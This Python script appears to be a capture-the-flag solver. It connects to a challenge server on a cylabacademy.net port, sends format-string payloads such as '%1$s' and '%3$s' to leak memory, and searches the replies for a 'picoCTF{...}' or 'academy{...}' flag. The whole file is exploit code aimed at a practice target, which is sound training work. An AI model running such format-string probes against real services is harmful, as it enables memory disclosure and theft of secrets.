import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 26615
for payload in (b"%1$s", b"%3$s", b"%2$s", b"%4$s", b"%1$s.%3$s"):
    try:
        s = socket.create_connection((HOST, PORT), timeout=12)
        s.settimeout(5)
        time.sleep(0.5)
        try:
            s.recv(4096)
        except Exception:
            pass
        s.sendall(payload + b"\n")
        time.sleep(0.8)
        out = b""
        try:
            out = s.recv(65536)
        except Exception:
            pass
        txt = out.decode("utf-8", "replace")
        print(f"--- {payload!r} ---")
        print(txt[:400])
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
        if m:
            print("FLAG:", m.group(0))
            s.close()
            break
        s.close()
    except Exception as e:
        print(payload, "err", type(e).__name__)
